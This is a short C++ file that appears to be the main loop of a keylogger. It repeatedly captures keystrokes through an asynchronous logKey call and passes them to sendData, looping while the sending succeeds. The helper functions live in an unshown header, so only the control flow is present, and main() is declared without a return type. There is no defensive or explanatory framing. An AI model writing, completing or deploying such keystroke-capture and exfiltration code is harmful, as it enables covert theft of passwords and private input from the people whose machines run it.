#include "Core.h"

using namespace std;

main() {
    future<char *> keys;
    bool dataSent;
    bool firstLoop = true;
    while ( firstLoop || dataSent ) {
        keys = async(logKey);
        dataSent = sendData(keys.get());
        firstLoop = false;
    }
    return 0;
}